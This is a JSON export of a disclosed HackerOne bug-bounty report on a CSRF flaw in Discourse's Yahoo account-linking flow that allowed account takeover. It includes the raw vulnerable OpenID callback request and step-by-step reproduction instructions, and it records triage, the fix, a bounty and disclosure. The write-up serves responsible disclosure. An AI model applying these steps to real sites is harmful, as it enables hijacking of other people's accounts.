{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-11-06T02:35:42.023Z", 
    "voters": [
        "muon4", 
        "nothellow0rld", 
        "an0nym0us", 
        "ak1t4", 
        "th3plumb3r", 
        "babayaga_", 
        "mygf", 
        "c1231665", 
        "ankitsingh", 
        "craxerbikash", 
        "and 16 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "512.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 423022, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "vulnerability_information": "Hi\n\nThere is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.\n\nI noticed Connect Yahoo account option have the workflow with GET method and  there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account, and it leads to full account takeover of victim's account.\n\nVulnerable Request:\n\nGET /auth/yahoo/callback?_method=post&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=id_res&openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost&openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.realm=https%3A%2F%2Ftry.discourse.org&openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&openid.ax.mode=fetch_response&openid.ax.value.email=testhackeroneay%40yahoo.com&openid.ax.value.fullname=test%20hackerone&openid.ax.value.nickname=test&openid.assoc_handle=abcd&openid.response_nonce=2018-10-12T16%3A27%defg-&openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist&openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth&openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&openid.pape.auth_level.nist=0&openid.sig=9p%2Bxyz HTTP/1.1\nHost: try.discourse.org\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\n\nSteps to reproduce:\n\n1. Attacker go to https://try.discourse.org/u/user/preferences/account\n2. Switch on burp interceptor and click on Yahoo connect.\n3. Go to burp interceptor and after forwarding some requests attacker will find the upper mentioned vulnerable request.\n4. Copy that and drop the request( here you saved the auth token generated by yahoo).\n5. Now feed the copied request to authenticated victim (as a html form or as an url).\n6. Victim get the message authentication complete and get redirected to https://try.discourse.org/?authComplete=true.\n7. Attacker open his browser and try to login with yahoo.\n8. Attacker get redirected to https://try.discourse.org/auth/yahoo/null\n9. Attacker open https://try.discourse.org\n10. Check Victim's account successfully compromised.\n\n## Impact\n\nAccount Takeover.", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "high", 
        "author_type": "User"
    }, 
    "title": "Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account", 
    "is_member_of_team?": null, 
    "vote_count": 26, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2018-12-06T02:35:42.078Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$512", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-10-27T13:21:13.595Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-27T13:21:13.595Z", 
            "actor": {
                "username": "avinash_", 
                "url": "/avinash_", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/173/906/15860318a03926e7e63bb81241b5685765514fa4_medium.JPG?1519404710"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Anybody to response?", 
            "markdown_message": "<p>Anybody to response?</p>\n", 
            "type": "Activities::Comment", 
            "id": 3543323, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-31T09:32:54.873Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-31T09:32:54.873Z", 
            "actor": {
                "username": "ktistai", 
                "url": "/ktistai", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/322/520/c5be4c4cd27f1ff9304fb7c00e4637caae71f206_medium.png?1536742438"
                }, 
                "hackerone_triager": true
            }, 
            "team_handle": "discourse", 
            "message": "Hi @avinash_ , \n\nThanks for your submission. We are currently reviewing your report and will get back to you once we have additional information to share.\n\nKind regards,\n@ktistai", 
            "markdown_message": "<p>Hi <a href=\"/avinash_\">@avinash_</a> , </p>\n\n<p>Thanks for your submission. We are currently reviewing your report and will get back to you once we have additional information to share.</p>\n\n<p>Kind regards,<br>\n<a href=\"/ktistai\">@ktistai</a></p>\n", 
            "type": "Activities::Comment", 
            "id": 3561676, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-31T10:03:11.606Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-31T10:03:11.606Z", 
            "actor": {
                "username": "ktistai", 
                "url": "/ktistai", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/322/520/c5be4c4cd27f1ff9304fb7c00e4637caae71f206_medium.png?1536742438"
                }, 
                "hackerone_triager": true
            }, 
            "team_handle": "discourse", 
            "message": "Hi @avinash_ \n\nThank you for your submission! We were able to validate your report, and we have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and if/when a fix will be implemented. Please note that the status and severity are subject to change.\n\nThanks, \n@ktistai", 
            "markdown_message": "<p>Hi <a href=\"/avinash_\">@avinash_</a> </p>\n\n<p>Thank you for your submission! We were able to validate your report, and we have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and if/when a fix will be implemented. Please note that the status and severity are subject to change.</p>\n\n<p>Thanks, <br>\n<a href=\"/ktistai\">@ktistai</a></p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 3561749, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-11-03T13:27:06.632Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-11-03T13:27:06.632Z", 
            "actor": {
                "username": "avinash_", 
                "url": "/avinash_", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/173/906/15860318a03926e7e63bb81241b5685765514fa4_medium.JPG?1519404710"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hi @ktistai \n\nIt seems fixed, On connecting yahoo account it is releasing csrf token(as state=token123). During reproducing the attack it behaving an error message as ```Sorry, there was an error authorizing your account. Perhaps you did not approve authorization?```.\n\nCan you please check this from your end !\n\nBest Regards", 
            "markdown_message": "<p>Hi <a href=\"/ktistai\">@ktistai</a> </p>\n\n<p>It seems fixed, On connecting yahoo account it is releasing csrf token(as state=token123). During reproducing the attack it behaving an error message as <code>Sorry, there was an error authorizing your account. Perhaps you did not approve authorization?</code>.</p>\n\n<p>Can you please check this from your end !</p>\n\n<p>Best Regards</p>\n", 
            "type": "Activities::Comment", 
            "id": 3580800, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "avinash_", 
                "url": "/avinash_"
            }, 
            "created_at": "2018-11-05T21:09:23.848Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-11-05T21:09:23.848Z", 
            "actor": {
                "username": "discourse_team", 
                "url": "/discourse_team", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/130/970/76f3cfd34fef4a1016e28d7164ec35a6f2a7bbeb_medium.png?1534409795"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 3589807, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2018-11-05T21:09:31.018Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-11-05T21:09:31.018Z", 
            "actor": {
                "url": "/discourse", 
                "profile": {
                    "name": "Discourse"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
                }
            }, 
            "team_handle": "discourse", 
            "bonus_amount": "0.0", 
            "bounty_amount": "512.0", 
            "collaborator": {
                "username": "avinash_", 
                "url": "/avinash_"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 3589808, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-11-06T02:32:57.775Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-11-06T02:32:57.775Z", 
            "actor": {
                "username": "avinash_", 
                "url": "/avinash_", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/173/906/15860318a03926e7e63bb81241b5685765514fa4_medium.JPG?1519404710"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "message": "Hi @discourse_team \n\nThanks for bounty :)\n\nBest Regards", 
            "markdown_message": "<p>Hi <a href=\"/discourse_team\">@discourse_team</a> </p>\n\n<p>Thanks for bounty :)</p>\n\n<p>Best Regards</p>\n", 
            "type": "Activities::Comment", 
            "id": 3591089, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-11-06T02:35:42.043Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-11-06T02:35:42.043Z", 
            "actor": {
                "username": "avinash_", 
                "url": "/avinash_", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/173/906/15860318a03926e7e63bb81241b5685765514fa4_medium.JPG?1519404710"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "discourse", 
            "first_to_agree": true, 
            "message": "Preety nice bug... Can we please disclose this?", 
            "markdown_message": "<p>Preety nice bug... Can we please disclose this?</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3591098, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-12-06T02:35:56.704Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-12-06T02:35:56.704Z", 
            "actor": {
                "url": "/discourse", 
                "profile": {
                    "name": "Discourse"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
                }
            }, 
            "team_handle": "discourse", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3772983, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "avinash_", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/avinash_", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/173/906/e3e9f01d074e36ff92d008a2c916a577d11f620f_small.JPG?1519404710"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -70680.639512419, 
    "disclosed_at": "2018-12-06T02:35:56.686Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/423022", 
    "created_at": "2018-10-12T16:57:57.640Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi</p>\n\n<p>There is an option in <a title=\"https://try.discourse.org/u/testh1ay/preferences/account\" href=\"/redirect?signature=620f65bd3d80a5f90fc59f25a12dc91330bc646c&amp;url=https%3A%2F%2Ftry.discourse.org%2Fu%2Ftesth1ay%2Fpreferences%2Faccount\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://try.discourse.org/u/testh1ay/preferences/account</span><i class=\"icon-external-link\"></i></a> to connect our Yahoo account.</p>\n\n<p>I noticed Connect Yahoo account option have the workflow with GET method and  there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker&#39;s yahoo account to victim&#39;s discourse account, and it leads to full account takeover of victim&#39;s account.</p>\n\n<p>Vulnerable Request:</p>\n\n<p>GET /auth/yahoo/callback?_method=post&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.mode=id_res&amp;openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost&amp;openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&amp;openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&amp;openid.realm=https%3A%2F%2Ftry.discourse.org&amp;openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&amp;openid.ax.mode=fetch_response&amp;openid.ax.value.email=testhackeroneay%40yahoo.com&amp;openid.ax.value.fullname=test%20hackerone&amp;openid.ax.value.nickname=test&amp;openid.assoc_handle=abcd&amp;openid.response_nonce=2018-10-12T16%3A27%defg-&amp;openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist&amp;openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth&amp;openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&amp;openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&amp;openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&amp;openid.pape.auth_level.nist=0&amp;openid.sig=9p%2Bxyz HTTP/1.1<br>\nHost: try.discourse.org<br>\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</p>\n\n<p>Steps to reproduce:</p>\n\n<ol>\n<li>Attacker go to <a title=\"https://try.discourse.org/u/user/preferences/account\" href=\"/redirect?signature=71160f9545a69e6cca5da9ab08d247bfa58892bd&amp;url=https%3A%2F%2Ftry.discourse.org%2Fu%2Fuser%2Fpreferences%2Faccount\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://try.discourse.org/u/user/preferences/account</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Switch on burp interceptor and click on Yahoo connect.</li>\n<li>Go to burp interceptor and after forwarding some requests attacker will find the upper mentioned vulnerable request.</li>\n<li>Copy that and drop the request( here you saved the auth token generated by yahoo).</li>\n<li>Now feed the copied request to authenticated victim (as a html form or as an url).</li>\n<li>Victim get the message authentication complete and get redirected to <a title=\"https://try.discourse.org/?authComplete=true\" href=\"/redirect?signature=efaaa7f92474b24e328ab36a3b1a89ec804ea8b5&amp;url=https%3A%2F%2Ftry.discourse.org%2F%3FauthComplete%3Dtrue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://try.discourse.org/?authComplete=true</span><i class=\"icon-external-link\"></i></a>.</li>\n<li>Attacker open his browser and try to login with yahoo.</li>\n<li>Attacker get redirected to <a title=\"https://try.discourse.org/auth/yahoo/null\" href=\"/redirect?signature=5ac25431c35c3ef0b7235a5bbd53a644f9ececc5&amp;url=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fnull\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://try.discourse.org/auth/yahoo/null</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Attacker open <a title=\"https://try.discourse.org\" href=\"/redirect?signature=4a03dd896aae349184c1a93c4c07f3716c7acc63&amp;url=https%3A%2F%2Ftry.discourse.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://try.discourse.org</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Check Victim&#39;s account successfully compromised.</li>\n</ol>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Account Takeover.</p>\n", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://discourse.org", 
            "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse", 
            "twitter_handle": "discourse", 
            "name": "Discourse"
        }, 
        "handle": "discourse", 
        "url": "https://hackerone.com/discourse", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/016/893/3dd37e1cfa3d9380ced573b87beae0c950703ddd_small.?1481849067", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/016/893/2ee366d05b47833a98f06c29cd5318d1bb134e20_medium.?1481849067"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 16893, 
        "default_currency": "usd"
    }, 
    "is_published": false
}